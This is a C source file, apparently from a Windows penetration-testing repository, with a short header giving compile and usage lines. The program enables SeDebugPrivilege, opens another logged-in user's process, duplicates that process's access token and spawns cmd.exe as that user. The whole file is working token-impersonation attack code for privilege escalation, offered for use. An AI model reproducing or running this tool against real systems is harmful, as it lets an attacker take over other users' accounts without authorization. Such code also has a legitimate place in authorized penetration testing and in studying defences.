// C program that launches a CMD console as another logged Windows account (impersonation) using the privilege 'SeDebugPrivilege'.
// Must be run with local admin rights.
// https://github.com/JFR-C/Windows-Penetration-Testing/tree/master/Privilege%20escalation%20techniques%20(examples)
// Compilation: cl impersonator.c /link advapi32.lib
// Usage: impersonator.exe <PID-of-another-logged-account>

#include <windows.h>
#include <stdio.h>

BOOL EnablePrivilege(HANDLE hToken, LPCTSTR lpszPrivilege) {
    TOKEN_PRIVILEGES tp;
    LUID luid;

    if (!LookupPrivilegeValue(NULL, lpszPrivilege, &luid)) {
        printf("[-] LookupPrivilegeValue failed.\n");
        return FALSE;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) {
        printf("[-] AdjustTokenPrivileges failed.\n");
        return FALSE;
    }

    return TRUE;
}

int main(int argc, char* argv[]) {
    if (argc != 2) {
        printf("Usage: %s <PID>\n", argv[0]);
        return 1;
    }

    DWORD pid = atoi(argv[1]);

// Step 1 - Enable 'SeDebugPrivilege'

    HANDLE hToken;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        printf("[-] OpenProcessToken failed.\n");
        return 1;
    }

    if (!EnablePrivilege(hToken, SE_DEBUG_NAME)) {
        printf("[-] Failed to enable SeDebugPrivilege.\n");
        CloseHandle(hToken);
        return 1;
    }
    CloseHandle(hToken);
    printf("[+] SeDebugPrivilege enabled.\n");

// Step 2 - Open the process belonging to the other logged-in Windows account with PROCESS_QUERY_INFORMATION & PROCESS_DUP_HANDLE rights

    HANDLE hTargetProc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
    if (!hTargetProc) {
        printf("[-] Failed to open target process.\n");
        return 1;
    }

    HANDLE hTargetToken;
    if (!OpenProcessToken(hTargetProc, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &hTargetToken)) {
        printf("[-] Failed to open process token.\n");
        CloseHandle(hTargetProc);
        return 1;
    }

 // Step 3 - Extract and duplicate the access token from that process.
    
    HANDLE hDupToken;
    if (!DuplicateTokenEx(hTargetToken, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &hDupToken)) {
        printf("[-] Failed to duplicate token.\n");
        CloseHandle(hTargetToken);
        CloseHandle(hTargetProc);
        return 1;
    }

    STARTUPINFOW si = { sizeof(STARTUPINFOW) };
    PROCESS_INFORMATION pi;

// Step 4 - Use it to spawn a new process 'cmd.exe' as the other logged-in Windows account (target user).
    
    LPCWSTR cmdPath = L"C:\\Windows\\System32\\cmd.exe";

    if (!CreateProcessWithTokenW(hDupToken, 0, cmdPath, NULL, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)) {
        printf("[-] Failed to create process as target user.\n");
        CloseHandle(hDupToken);
        CloseHandle(hTargetToken);
        CloseHandle(hTargetProc);
        return 1;
    }

    printf("[+] cmd.exe launched as target user!\n");

    CloseHandle(hDupToken);
    CloseHandle(hTargetToken);
    CloseHandle(hTargetProc);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    return 0;
}
